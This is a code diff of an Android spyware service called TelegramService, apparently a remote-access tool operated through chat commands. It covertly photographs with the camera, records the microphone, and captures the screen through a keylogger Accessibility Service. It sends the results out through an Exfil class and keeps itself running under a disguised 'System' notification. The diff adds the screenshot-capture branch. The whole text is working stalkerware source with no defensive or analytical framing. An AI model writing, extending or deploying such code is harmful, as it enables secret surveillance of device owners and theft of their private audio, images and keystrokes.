@@ -5,17 +5,13 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.graphics.ImageFormat;
 import android.hardware.camera2.*;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaRecorder;
 import android.os.Build;
-import android.os.Environment;
 import android.os.IBinder;
-import android.util.Log;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.File;
@@ -32,7 +28,6 @@ public class TelegramService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-        // Foreground notification bach Android ma-y9telch l'app
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
@@ -79,15 +74,20 @@ public class TelegramService extends Service {
         } else if (cmd.equals("/mic")) {
             recordAudio();
         } else if (cmd.equals("/screenshot")) {
-            Exfil.send("Please enable Screen Capture in MainActivity.");
+            if (KeyloggerService.instance != null) {
+                Exfil.send("📸 Capturing screen...");
+                KeyloggerService.instance.captureScreen();
+            } else {
+                Exfil.send("⚠️ Accessibility Service is OFF. Please enable it.");
+            }
         }
     }
 
-    // ================== CAMERA ==================
+    // (Camera w Mic bqa kif ma kanou...)
     private void takePhoto() {
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-            String cameraId = manager.getCameraIdList()[0]; // 0 = Back, 1 = Front
+            String cameraId = manager.getCameraIdList()[0];
             manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
                 public void onOpened(CameraDevice camera) {
@@ -128,7 +128,6 @@ public class TelegramService extends Service {
         } catch (Exception e) {}
     }
 
-    // ================== MIC ==================
     private void recordAudio() {
         try {
             File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
@@ -154,4 +153,4 @@ public class TelegramService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override
     public IBinder onBind(Intent intent) { return null; }
-                                         }
+}
